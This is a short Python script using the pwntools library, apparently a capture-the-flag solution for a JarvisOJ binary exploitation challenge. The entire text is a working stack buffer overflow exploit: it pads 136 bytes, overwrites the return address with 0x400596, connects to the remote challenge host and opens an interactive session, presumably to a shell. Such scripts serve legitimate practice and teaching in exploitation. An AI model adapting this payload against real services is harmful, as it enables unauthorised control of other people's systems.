#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = ‘Albertchang'

from pwn import *
payload = 'a' * 136 + p64(0x400596)
p = remote('pwn2.jarvisoj.com',9881)
p.recvuntil('Hello, World')
p.sendline(payload)
p.interactive()
